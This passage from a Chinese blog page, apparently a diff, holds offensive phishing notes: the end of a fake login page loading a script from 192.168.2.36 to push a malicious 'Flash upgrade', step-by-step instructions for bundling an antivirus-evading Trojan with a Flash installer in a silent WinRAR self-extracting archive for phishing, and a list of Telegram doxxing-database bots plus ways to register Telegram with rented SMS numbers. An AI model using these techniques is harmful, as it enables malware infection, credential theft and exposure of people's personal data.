white;</span><br><span class="line">            padding: 40px;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> 20px rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            width: 350px;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">            color: <span class="comment">#4568DC;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">input</span> &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            background-color: <span class="comment">#f2f2f2;</span></span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            opacity: <span class="number">0.9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://192.168.2.36/2/flash.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;欢迎登录&lt;/h1&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;用户名&quot;</span> required&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span> required&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://192.168.2.36/2/flash.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="BK2Xi"></a></p>
+<h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><p><a name="LGWoC"></a></p>
+<h3 id="5、尝试访问-1"><a href="#5、尝试访问-1" class="headerlink" title="5、尝试访问"></a>5、尝试访问<br /><br /></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714218827877-dfd8045e-d899-4808-b148-301f927f94d4.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_39,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp/resize,w_1237,limit_0#averageHue=%23404977&from=url&id=gMLuy&originHeight=1194&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>点击立即升级会下载恶意文件<br />若是想要解决自己制作页面就要找到相应的代码改进<br />在flash的文档的里是为了打开网页后进行点击进行跳转的设置onclick&#x3D;window.location.href&#x3D;’calc.exe’&gt;</div></div></div>“在下划线进行更改。<br />在login.php里的文件里弄这个跳转，然后再进行更改代码。</p>
+<p><a name="UaY0U"></a></p>
+<h2 id="13、-自解压捆绑木马-1"><a href="#13、-自解压捆绑木马-1" class="headerlink" title="13、 自解压捆绑木马"></a>13、 自解压捆绑木马</h2><p><a name="OL67K"></a></p>
+<h3 id="1、自解压捆绑木马-1"><a href="#1、自解压捆绑木马-1" class="headerlink" title="1、自解压捆绑木马"></a>1、自解压捆绑木马</h3><p><br />1.生成个马并免杀<br />2.自解压文件生成<br />a.将flash与马放到同一文件<br />b.使用winrar创建压缩文件 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955534381-19671bf8-02ee-417e-a635-c250ab4a8769.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23eeeeed&from=url&id=kyjmj&originHeight=522&originWidth=525&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>c.高级-&gt;高级自解压选项，路径设置 C:\windows\temp <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955673698-5da4a2a2-1dd3-4832-8c69-949d8ac775a1.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f7f6f6&from=url&id=ftCUV&originHeight=292&originWidth=497&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>d.设置添加 C:\windows\temp\flashcenter_pp_ax_install_cn.exe C:\windows\temp\flash.exe<br />e<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955751119-c6139afd-f751-45bc-996f-4732310952b3.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f6f6f6&from=url&id=huNRk&originHeight=638&originWidth=540&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>f. 模式设置全部隐藏 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955844728-d6c6f46c-3e2b-483f-b8e8-f4534e25ebee.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_12,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f6f5f5&from=url&id=UtaLE&originHeight=391&originWidth=433&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>g. 更新设置 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/26698826/1667955880117-b4557a7b-86a0-4881-9d00-cb7966fb97e0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23f5f5f4&from=url&id=Hcukl&originHeight=391&originWidth=482&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>h.生成<br />3.替换图标<br />a.1<br />4.钓鱼<br><a name="EnlkM"></a></p>
+<h2 id="14、虚拟账号的购买telegram-1"><a href="#14、虚拟账号的购买telegram-1" class="headerlink" title="14、虚拟账号的购买telegram"></a>14、虚拟账号的购买telegram</h2><p><a name="W59R2"></a></p>
+<h3 id="1、TG社工库-1"><a href="#1、TG社工库-1" class="headerlink" title="1、TG社工库"></a>1、TG社工库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">您的专属邀请链接:https://t.me/AJL01_bot?start=C9uZSsbKX1</span><br><span class="line">社工庫机器人: t.me/aishegongkubot?start=AISGK_HBEIR85X</span><br><span class="line">https://t.me/DATA_007bot?start=<span class="number">8989324940</span></span><br><span class="line">https://t.me/pingansgk_bot?start=ee95c5680f</span><br><span class="line">https://t.me/JokerSGKbot?start=87OE61VQ</span><br><span class="line">https://t.me/PyramidNetBot?start=pRg3K08</span><br><span class="line">https://t.me/XingDun2Bot?start=4eoHoLE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="kDWYD"></a></p>
+<h3 id="2、tg注册-2023-11-27-1"><a href="#2、tg注册-2023-11-27-1" class="headerlink" title="2、tg注册(2023&#x2F;11&#x2F;27)"></a>2、tg注册(2023&#x2F;11&#x2F;27)</h3><p><a name="TLzrM"></a></p>
+<h4 id="1、方法1（建议这个）-1"><a href="#1、方法1（建议这个）-1" class="headerlink" title="1、方法1（建议这个）"></a>1、方法1（建议这个）</h4><ol>
+<li>注册并充值<a target="_blank" rel="noopener" href="https://sms-activate.org/cn">sms</a></li>
+<li>手机挂代理，并打开tg</li>
+<li>手机tg输入sms手机号</li>
+<li>输入sms平台接收的验证码，手机成功登录</li>
+<li>手机扫码登录电脑TG</li>
+<li><code>tg://setlanguage?lang=classic-zh-cn</code>设置中文<br><a name="ChdLI"></a></li>
+</ol>
+<h4 id="2、方法2-高成功率-1"><a href="#2、方法2-高成功率-1" class="headerlink" title="2、方法2(高成功率)"></a>2、方法2(高成功率)</h4><ol>
+<li>注册并充值<a target="_blank" rel="noopener" href="https://sms-activate.org/cn">sms</a></li>
+<li>在手机<code>play商店</code>中下载<code>telegram X</code></li>
+<li>手机挂代理，并打开刚刚下载的<code>telegram X</code>，使用sms平台的手机号</li>
+<li>接收验证码即可</li>
+</ol>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>Help us with donation</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
